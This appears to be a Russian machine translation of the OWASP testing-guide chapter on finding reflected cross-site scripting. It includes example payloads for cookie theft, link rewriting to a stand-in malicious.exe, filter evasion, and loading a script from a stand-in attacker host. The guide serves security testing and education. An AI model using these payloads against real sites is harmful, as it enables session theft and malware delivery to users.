# Тестирование для отраженного кросс-сайта

| ID |
| ------------- |
| WSTG-INPV-01 |

## Резюме

Отраженный [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) происходят, когда злоумышленник вводит исполняемый код браузера в один HTTP-ответ. Инъекционная атака не сохраняется в самом приложении; оно непостоянно и влияет только на пользователей, которые открывают злонамеренно созданную ссылку или стороннюю веб-страницу. Строка атаки включена как часть созданных параметров URI или HTTP, неправильно обработана приложением и возвращена жертве.

Отраженные XSS являются наиболее частым типом XSS-атак, встречающихся в дикой природе. Отраженные атаки XSS также известны как непостоянные атаки XSS, и, поскольку полезная нагрузка атаки доставляется и выполняется с помощью одного запроса и ответа, они также называются XSS первого порядка или типа 1

Когда веб-приложение уязвимо для этого типа атаки, оно передает неподтвержденный ввод, отправленный через запросы, обратно клиенту. Общий способ действия атаки включает этап проектирования, в котором злоумышленник создает и тестирует нарушающий URI, шаг социальной инженерии, в котором она убеждает своих жертв загрузить этот URI в своих браузерах, и возможное выполнение кода оскорбления с использованием браузера жертвы.

Обычно код злоумышленника пишется на языке JavaScript, но также используются другие языки сценариев, например,.ActionScript и VBScript. Атакующие обычно используют эти уязвимости для установки регистраторов ключей, кражи файлов cookie жертв, кражи буфера обмена и изменения содержимого страницы (например,., скачать ссылки).

Одной из основных трудностей в предотвращении уязвимостей XSS является правильное кодирование символов. В некоторых случаях веб-сервер или веб-приложение не могли фильтровать некоторые кодировки символов, поэтому, например, веб-приложение может отфильтровывать `<script> `, но не может фильтровать`%3cscript%3e`, который просто включает другая кодировка тегов.

## Цели теста

- Определите переменные, которые отражены в ответах.
- Оцените входные данные, которые они принимают, и кодировку, которая применяется при возврате (если есть).

## Как проверить

### Тестирование черного ящика

Тест черного ящика будет включать как минимум три этапа:

#### Обнаружение векторов ввода

Обнаружение входных векторов. Для каждой веб-страницы тестер должен определить все пользовательские переменные веб-приложения и способы их ввода. Это включает в себя скрытые или неочевидные входы, такие как параметры HTTP, данные POST, значения полей скрытой формы и предварительно определенные значения радио или выбора. Обычно в браузере используются редакторы HTML или веб-прокси для просмотра этих скрытых переменных. Смотрите пример ниже.

#### Анализировать входные векторы

Проанализируйте каждый входной вектор, чтобы обнаружить потенциальные уязвимости. Чтобы обнаружить уязвимость XSS, тестер обычно использует специально созданные входные данные с каждым входным вектором. Такие входные данные обычно безвредны, но вызывают ответы от веб-браузера, которые проявляют уязвимость. Тестирование данных может быть сгенерировано с помощью размыкателя веб-приложений, автоматического предварительно определенного списка известных строк атаки или вручную.
  Некоторым примером таких входных данных являются следующие:

- `<script>alert(123)</script>`
- `"><script>alert(document.cookie)</script>`

Полный список потенциальных тестовых строк см. В [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).

#### Проверьте Воздействие

Для каждого ввода теста, предпринятого на предыдущем этапе, тестер проанализирует результат и определит, представляет ли он уязвимость, которая реально влияет на безопасность веб-приложения. Это требует изучения полученной веб-страницы HTML и поиска тестовых данных. После обнаружения тестер идентифицирует любые специальные символы, которые не были должным образом закодированы, заменены или отфильтрованы. Набор уязвимых нефильтрованных специальных символов будет зависеть от контекста этого раздела HTML

В идеале все специальные символы HTML будут заменены объектами HTML. Ключевые объекты HTML для идентификации:

- `>` (greater than)
- `<` (less than)
- `&` (ampersand)
- `'` (apostrophe or single quote)
- `"` (double quote)

Однако полный список объектов определяется спецификациями HTML и XML. [Wikipedia has a complete reference](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references).

Wв контексте действия HTML или кода JavaScript потребуется экранировать, кодировать, заменять или отфильтровать другой набор специальных символов. Эти символы включают в себя:

- `\n` (new line)
- `\r` (carriage return)
- `'` (apostrophe or single quote)
- `"` (double quote)
- `\` (backslash)
- `\uXXXX` (unicode values)

Для более полной ссылки см [Mozilla JavaScript guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings).

#### Пример 1

Например, рассмотрим сайт с приветственным уведомлением `Welcome %username%` и ссылкой для скачивания.

![XSS Example 1](images/XSS_Example1.png)\
*Figure 4.7.1-1: XSS Example 1*

Тестер должен подозревать, что каждая точка ввода данных может привести к атаке XSS. Чтобы проанализировать это, тестер будет играть с пользовательской переменной и попытаться вызвать уязвимость.

Давайте попробуем нажать на следующую ссылку и посмотрим, что произойдет:

```text
http://example.com/index.php?user=<script>alert(123)</script>
```

Если дезинфекция не применяется, это приведет к следующему всплывающему сообщению:

![Alert](images/Alert.png)\
*Figure 4.7.1-2: XSS Example 1*

Это указывает на то, что существует уязвимость XSS, и кажется, что тестер может выполнить код по своему выбору в любом браузере, если он нажимает на ссылку тестера.

#### Пример 2

Давайте попробуем другой кусок кода (ссылка) :

```text
http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "http://badexample.com/malicious.exe";}</script>
```

Это производит следующее поведение:

![XSS Example 2](images/XSS_Example2.png)\
*Figure 4.7.1-3: XSS Example 2*

Это заставит пользователя, щелкнув по ссылке, предоставленной тестером, загрузить файл `malicious.exe` с сайта, который он контролирует.

### Обход фильтров XSS

Отраженные межсайтовые атаки сценариев предотвращаются, поскольку веб-приложение дезинфицирует ввод, брандмауэр веб-приложения блокирует вредоносный ввод или с помощью механизмов, встроенных в современные веб-браузеры. Тестер должен проверить наличие уязвимостей, предполагая, что веб-браузеры не предотвратят атаку. Браузеры могут быть устаревшими или иметь отключенные встроенные функции безопасности. Точно так же брандмауэры веб-приложений не гарантированно распознают новые, неизвестные атаки. Злоумышленник может создать строку атаки, которая не распознается брандмауэром веб-приложения.

Таким образом, большая часть профилактики XSS должна зависеть от дезинфекции веб-приложения ненадежным пользовательским вводом. Разработчикам доступно несколько механизмов для дезинфекции, таких как возврат ошибки, удаление, кодирование или замена недопустимого ввода. Средства, с помощью которых приложение обнаруживает и исправляет неверный ввод, являются еще одним основным недостатком в предотвращении XSS. Список отказов может не включать все возможные строки атаки, список разрешений может быть чрезмерно разрешающим, дезинфекция может потерпеть неудачу, или тип ввода может быть неправильно доверен и оставаться несанитизованным. Все это позволяет злоумышленникам обойти фильтры XSS.

The [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) документы общих испытаний на уклонение от фильтра.

#### Пример 3: Значение атрибута тега

Поскольку эти фильтры основаны на списке запретов, они не могут блокировать все типы выражений. Фактически, есть случаи, когда эксплойт XSS может выполняться без использования тегов <script> `и даже без использования символов, таких как` <` и `> `, которые обычно фильтруются.

Например, веб-приложение может использовать значение ввода пользователя для заполнения атрибута, как показано в следующем коде:

```html
<input type="text" name="state" value="INPUT_FROM_USER">
```

Затем злоумышленник может отправить следующий код:

```text
" onfocus="alert(document.cookie)
```

#### Пример 4: Другой синтаксис или кодирование

В некоторых случаях возможно, что фильтры на основе подписи могут быть просто побеждены путем запутывания атаки. Как правило, вы можете сделать это путем вставки неожиданных изменений в синтаксис или в сопряжение. Эти изменения допускаются браузерами как действительный HTML при возврате кода, и все же они также могут быть приняты фильтром.

Следуя некоторым примерам:

- `"><script >alert(document.cookie)</script >`
- `"><ScRiPt>alert(document.cookie)</ScRiPt>`
- `"%3cscript%3ealert(document.cookie)%3c/script%3e`

#### Пример 5: Обход нерекурсивной фильтрации

Иногда дезинфекция применяется только один раз, и она не выполняется рекурсивно. В этом случае злоумышленник может победить фильтр, отправив строку, содержащую несколько попыток, например, эту :

```text
<scr<script>ipt>alert(document.cookie)</script>
```

#### Пример 6: Включая внешний скрипт

Теперь предположим, что разработчики целевого сайта внедрили следующий код для защиты ввода от включения внешнего скрипта:

```php
<?
    $re = "/<script[^>]+src/i";

    if (preg_match($re, $_GET['var']))
    {
        echo "Filtered";
        return;
    }
    echo "Welcome ".$_GET['var']." !";
?>
```

Разделение вышеуказанного регулярного выражения:

1. Проверьте для `<script`
2. Проверьте на "" (белое пространство)
3. Любой символ, кроме символа `> ` для одного или нескольких вхождений
4. Проверьте на `src`

Это полезно для фильтрации выражений типа `<script src="http://attacker/xss.js"></ script> `, что является обычной атакой. Но в этом случае можно обойти дезинфекцию, используя символ `> ` в атрибуте между script и src, например:

```text
http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
```

Это будет использовать отраженную уязвимость скриптов кросс-сайтов, показанную ранее, выполняя код JavaScript, сохраненный на веб-сервере злоумышленника, как если бы он был создан с веб-сайта жертвы, `http: // example /`.

#### Пример 7: Загрязнение параметров HTTP (HPP)

Другим методом обхода фильтров является загрязнение параметров HTTP, этот метод был впервые представлен Стефано ди Паола и Лукой Кареттони в 2009 году на конференции OWASP в Польше. См. [Тестирование на загрязнение параметров HTTP](04-Testing_for_HTTP_Parameter_Pollution.md) для получения дополнительной информации. Эта техника уклонения состоит из разделения вектора атаки между несколькими параметрами, имеющими одно и то же имя. Манипулирование значением каждого параметра зависит от того, как каждая веб-технология анализирует эти параметры, поэтому этот тип уклонения не всегда возможен. Если тестируемая среда объединяет значения всех параметров с одним и тем же именем, то злоумышленник может использовать эту технику, чтобы обойти механизмы безопасности на основе шаблонов.
Регулярная атака:

```text
http://example/page.php?param=<script>[...]</script>
```

Атака с использованием HPP:

```text
http://example/page.php?param=<script&param=>[...]</&param=script>
```

Смотрите [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) для более подробного списка методов уклонения от фильтров. Наконец, анализ ответов может стать сложным. Простой способ сделать это - использовать код, который открывает диалоговое окно, как в нашем примере. Это обычно указывает на то, что злоумышленник может выполнить произвольный JavaScript по своему выбору в браузерах посетителей.

### Тестирование серой коробки

Тестирование серого ящика похоже на тестирование черного ящика. В тестировании «серой коробки» у мастера-ручки есть частичные знания о применении. В этом случае информация о пользовательском вводе, элементах управления проверкой ввода и о том, как пользовательский ввод возвращается пользователю, может быть известна настройщику.

Если доступен исходный код (тестирование в белом ящике), все переменные, полученные от пользователей, должны быть проанализированы. Кроме того, тестер должен проанализировать любые процедуры дезинфекции, чтобы решить, можно ли их обойти.

## Tools

- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
- [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
- [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
- [ratproxy](https://code.google.com/archive/p/ratproxy/) is a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments.
- [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.

## References

### OWASP Resources

- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Books

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3

### Whitepapers

- [CERT - Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)
- [cgisecurity.com - The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)
- [G.Ollmann - HTML Code Injection and Cross-site scripting](http://www.technicalinfo.net/papers/CSS.html)
- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat](https://www.techzoom.net/Publications/Insecurity-Iceberg)
